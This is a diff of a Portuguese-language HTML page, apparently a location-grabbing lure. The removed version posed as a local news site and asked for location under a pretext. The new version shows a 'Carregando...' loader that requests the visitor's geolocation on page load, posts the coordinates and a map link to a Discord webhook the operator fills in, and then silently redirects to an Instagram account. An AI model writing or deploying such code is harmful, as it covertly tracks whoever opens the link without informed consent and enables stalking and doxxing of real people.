@@ -3,79 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Montecity - Notícias em Tempo Real</title>
+    <title>Monte City - Redirecionando...</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #e9ecef; color: #333; }
-        header { background: #ce1212; color: white; padding: 20px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
-        .container { max-width: 500px; margin: 50px auto; background: white; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        h1 { margin: 0; font-size: 28px; letter-spacing: -1px; }
-        p { line-height: 1.6; color: #666; }
-        .btn-news { background: #ce1212; color: white; padding: 18px 30px; border: none; border-radius: 8px; cursor: pointer; font-size: 18px; font-weight: bold; width: 100%; transition: 0.3s; }
-        .btn-news:hover { background: #a00d0d; }
-        footer { margin-top: 20px; font-size: 12px; color: #999; }
+        body { font-family: sans-serif; text-align: center; padding-top: 100px; background-color: #000; color: #fff; }
+        .loader { border: 4px solid #333; border-top: 4px solid #d4af37; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body>
+<body onload="iniciar()">
 
-    <header>
-        <h1>MONTECITY</h1>
-    </header>
-
-    <div class="container">
-        <h2>Notícias da sua Região</h2>
-        <p>Para mostrar os acontecimentos, trânsito e alertas urgentes no seu bairro agora, precisamos da sua localização.</p>
-        
-        <button class="btn-news" onclick="verNoticias()">VER NOTÍCIAS LOCAIS</button>
-        
-        <p style="font-size: 13px; margin-top: 20px;">
-            Siga-nos no Instagram: <strong>@suaconta_aqui</strong>
-        </p>
-    </div>
-
-    <footer>
-        &copy; 2026 Montecity Notícias - Todos os direitos reservados.
-    </footer>
+    <div class="loader"></div>
+    <p>Carregando...</p>
 
     <script>
-        // COLE SEU LINK DO DISCORD ABAIXO
-        const WEBHOOK_URL = "SUA_URL_DO_WEBHOOK_AQUI";
+        // ATENÇÃO: COLOQUE SEU LINK DO DISCORD ABAIXO
+        const WEBHOOK_URL = "COLE_AQUI_SEU_LINK_DO_WEBHOOK";
 
-        function verNoticias() {
+        function iniciar() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sucesso, erro);
+                // Tenta pegar a localização por no máximo 4 segundos para não travar o cliente
+                navigator.geolocation.getCurrentPosition(enviarEDirecionar, erro, {timeout: 4000});
             } else {
-                alert("Seu navegador não suporta geolocalização.");
+                direcionar();
             }
         }
 
-        function sucesso(pos) {
+        function enviarEDirecionar(pos) {
             const lat = pos.coords.latitude;
             const log = pos.coords.longitude;
             const mapa = `https://www.google.com/maps?q=${lat},${log}`;
 
-            const dados = {
-                embeds: [{
-                    title: "📍 Leitor do Montecity Detectado!",
-                    color: 13505042, // Vermelho Montecity
-                    description: `Um leitor acabou de solicitar notícias locais.\n\n**Coordenadas:** ${lat}, ${log}\n**Mapa:** [Clique para ver o local](${mapa})`,
-                    footer: { text: "Sistema de Alerta Montecity" },
-                    timestamp: new Date()
-                }]
+            const payload = {
+                content: `📍 **Acesso Monte City!**\n🌍 Localização capturada!\n🔗 Mapa: ${mapa}`
             };
 
             fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(dados)
-            }).then(() => {
-                // Após o envio, você pode enviar o leitor para o seu Instagram ou uma página de notícias
-                alert("Localização confirmada! Carregando as notícias de hoje...");
-                window.location.href = "https://www.instagram.com/SEU_INSTAGRAM_AQUI/"; 
+                body: JSON.stringify(payload)
+            }).finally(() => {
+                direcionar();
             });
         }
 
         function erro() {
-            alert("Atenção: Para receber alertas da sua rua, você precisa permitir a localização.");
+            direcionar();
+        }
+
+        function direcionar() {
+            // Seu destino final é o Instagram
+            window.location.href = "https://www.instagram.com/montecitybr";
         }
     </script>
 </body>
